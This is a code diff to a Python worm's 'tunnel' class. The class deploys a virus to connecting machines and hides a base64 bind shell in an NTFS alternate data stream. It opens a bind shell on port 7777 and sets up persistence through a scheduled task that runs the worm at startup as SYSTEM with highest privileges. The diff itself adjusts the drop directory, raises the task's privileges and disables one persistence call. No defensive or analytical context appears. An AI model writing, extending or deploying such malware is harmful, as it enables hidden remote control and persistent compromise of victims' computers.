@@ -21,10 +21,14 @@ class tunnel(threading.Thread):
         conn.settimeout(10)
         self.set_connection(conn,addr)
         print("Got a connection from: {}",addr)
-        dir = "/Users/Public/"
+        
         osplatform = "windows"
+        if osplatform == "windows":
+            dir = "/Users/Public/"
+        else:
+            dir = "/tmp/"
         self.deploy_virus(self.worm.getfiledata(),conn, osplatform, dir)
-        self.create_persistence(conn, dir)
+        #self.create_persistence(conn, dir)
         conn.close()
     
     
@@ -93,7 +97,7 @@ class tunnel(threading.Thread):
         print("Create a Bind Shell on Port 7777")
         print(self.get_response(conn,8192))
 
-        command = b'Set-Content -path "$env:temp\\remain.tmp:hidden" -Value "'
+        command = 'Set-Content -path "C:/{}remain.tmp:hidden" -Value "'.format(dir).encode()
         command += self.generate_base64_bind_shell_code("windows").encode()
         command += b'"'
         command+=b"\n"
@@ -157,7 +161,7 @@ class tunnel(threading.Thread):
             print("Target Response: {}".format(self.get_response(conn,1024)))
             
             #Setup Self execute on startup
-            command = 'schtasks /create /tn "scannerr" /tr "C://{}{}_tworm.exe" /sc onstart'.format(dir,self.lhost).encode()
+            command = 'schtasks /create /tn "scannerr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "C:/{}{}_tworm.exe"'.format(dir,self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("Target Response: {}".format(self.get_response(conn,1024)))
